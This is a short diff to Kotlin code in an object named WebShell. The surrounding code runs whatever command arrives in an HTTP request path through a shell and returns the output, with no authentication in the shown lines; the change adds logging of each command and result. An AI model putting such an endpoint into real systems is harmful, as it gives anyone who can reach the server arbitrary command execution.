@@ -20,7 +20,9 @@ object WebShell {
                 http.sendResponseHeaders(200, 0)
                 PrintWriter(http.responseBody).use { out ->
                     val command = URLDecoder.decode(http.requestURI.toString(), "utf-8").substring(1)
-                    out.println(Shell.exec(command))
+                    val result = Shell.exec(command)
+                    out.println(result)
+                    log.info("$command -> $result")
                 }
             }
             start()
